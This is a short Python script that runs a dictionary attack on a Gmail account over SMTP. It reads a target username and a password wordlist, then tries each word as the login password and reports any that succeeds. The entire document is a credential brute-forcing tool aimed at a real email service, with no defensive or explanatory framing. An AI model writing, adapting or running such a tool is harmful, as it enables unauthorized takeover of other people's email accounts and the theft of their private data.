import smtplib
import sys

user = sys.argv[1]
passwdfile = sys.argv[2]

server = 'smtp.gmail.com'
port = 587

smtp = smtplib.SMTP(server, port)
smtp.ehlo()
smtp.starttls()

def connect(user, passwd):
  try:
    smtp.login(user, passwd)
    print('[*] Password found: %s ' % passwd)
  except:
    print('[*] Attempting Password: %s ' % passwd)
    
file = open(passwdfile, 'r')

for word in file:
  connect(user, word)
